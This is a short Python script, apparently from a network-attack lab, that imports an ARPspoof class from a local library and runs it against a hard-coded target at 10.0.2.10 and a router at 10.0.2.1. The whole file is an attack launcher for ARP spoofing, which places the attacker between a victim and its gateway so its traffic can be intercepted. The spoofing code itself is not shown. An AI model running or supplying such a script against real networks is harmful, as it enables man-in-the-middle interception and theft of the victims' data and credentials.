# !/usr/bin/python3
from libs.arp import ARPspoof

# define global variables
TARGET_IP = "10.0.2.10"
ROUTER_IP = "10.0.2.1"

arp_spoofer = ARPspoof(TARGET_IP, ROUTER_IP)
arp_spoofer.run()